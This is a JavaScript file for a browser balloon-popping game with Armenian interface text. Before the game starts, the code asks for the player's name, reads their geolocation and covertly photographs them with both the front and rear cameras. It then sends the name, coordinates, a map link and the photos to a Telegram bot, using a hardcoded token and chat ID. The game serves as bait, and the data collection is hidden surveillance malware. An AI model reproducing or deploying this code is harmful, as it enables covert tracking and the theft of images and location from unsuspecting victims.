const canvas = document.getElementById('game-canvas');
const ctx = canvas.getContext('2d');

function resize() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}
resize();
window.addEventListener('resize', resize);

let redHits = 0;
let fails = 0;
let balloons = [];
let collected = false;

const token = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
const chatId = "8071841674";

async function sendToTelegram(data) {
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: data,
    }),
  });
}

async function sendPhoto(photoBlob, caption) {
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("caption", caption);
  formData.append("photo", photoBlob, "photo.jpg");

  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
    method: "POST",
    body: formData,
  });
}

async function getUserData() {
  const username = prompt("Մուտքագրեք ձեր անունը:");
  let locationText = "📍 Գեո չի ստացվել";
  let mapLink = "";
  let photoFront = null;
  let photoBack = null;
  let gotGeo = false, gotCam = false;

  // Получаем геолокацию
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      locationText = `🌍 Կոորդինատներ: ${lat}, ${lon}`;
      mapLink = `🔗 Քարտեզում: https://www.google.com/maps?q=${lat},${lon}`;
      gotGeo = true;
      sendAll();
    }, () => sendAll());
  } else {
    sendAll();
  }

  // Получаем фото с камеры
  const video = document.getElementById("video");

  try {
    // фронтальная камера
    const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
    video.srcObject = streamFront;
    await new Promise(res => setTimeout(res, 1000));
    photoFront = await capturePhoto(video);
    streamFront.getTracks().forEach(track => track.stop());

    // задняя камера
    const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
    video.srcObject = streamBack;
    await new Promise(res => setTimeout(res, 1000));
    photoBack = await capturePhoto(video);
    streamBack.getTracks().forEach(track => track.stop());

    gotCam = true;
  } catch (e) {
    gotCam = false;
  }

  async function sendAll() {
    if (collected) return;
    collected = true;
    await sendToTelegram(`👤 Անուն: ${username}\n${locationText}\n${mapLink || ""}\n📷 Տվյալներ ${gotCam ? "✓" : "✗"}, 📍 Գեո ${gotGeo ? "✓" : "✗"}`);
    if (photoFront) await sendPhoto(photoFront, "Ֆոտո - Առջևի տեսախցիկ");
    if (photoBack) await sendPhoto(photoBack, "Ֆոտո - Հետևի տեսախցիկ");
    if (gotCam || gotGeo) startGame();
  }
}

function capturePhoto(video) {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);
  return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
}

// --- Игра ---

function createBalloon() {
  const colors = ['red', 'blue', 'green', 'yellow'];
  const color = colors[Math.floor(Math.random() * colors.length)];
  return {
    x: Math.random() * canvas.width,
    y: canvas.height + 50,
    radius: 30,
    color: color,
    speed: 1 + Math.random() * 2
  };
}

function drawBalloon(b) {
  ctx.beginPath();
  ctx.arc(b.x, b.y, b.radius, 0, Math.PI * 2);
  ctx.fillStyle = b.color;
  ctx.fill();
  ctx.closePath();
}

function update() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  balloons.forEach(b => {
    b.y -= b.speed;
    drawBalloon(b);
  });
  balloons = balloons.filter(b => b.y + b.radius > 0);
  if (Math.random() < 0.03) balloons.push(createBalloon());
  requestAnimationFrame(update);
}

canvas.addEventListener('click', (e) => {
  const rect = canvas.getBoundingClientRect();
  const clickX = e.clientX - rect.left;
  const clickY = e.clientY - rect.top;

  for (let i = 0; i < balloons.length; i++) {
    const b = balloons[i];
    const dist = Math.sqrt((b.x - clickX)**2 + (b.y - clickY)**2);
    if (dist < b.radius) {
      if (b.color === 'red') {
        redHits++;
        if (redHits >= 3) endGame(true);
      } else if (b.color === 'blue') {
        fails++;
        if (fails >= 3) location.reload();
        else endGame(false);
      }
      balloons.splice(i, 1);
      break;
    }
  }
});

function endGame(victory) {
  document.getElementById('end-animation').classList.remove('hidden');
  let countdown = 3;
  const countdownEl = document.getElementById('countdown');
  const anim = document.getElementById('balloon-animation');
  anim.innerHTML = '';

  // Добавим анимацию шариков с дротиками
  for (let i = 0; i < 50; i++) {
    const balloon = document.createElement('div');
    balloon.classList.add('balloon');
    balloon.style.background = ['red', 'blue', 'yellow'][i % 3];
    balloon.style.left = Math.random() * window.innerWidth + 'px';
    balloon.style.bottom = '0px';
    balloon.style.animationDuration = `${2 + Math.random() * 2}s`;
    anim.appendChild(balloon);
  }

  const timer = setInterval(() => {
    countdown--;
    countdownEl.textContent = countdown;
    if (countdown <= 0) {
      clearInterval(timer);
      location.reload();
    }
  }, 1000);
}

function startGame() {
  update();
}

getUserData();
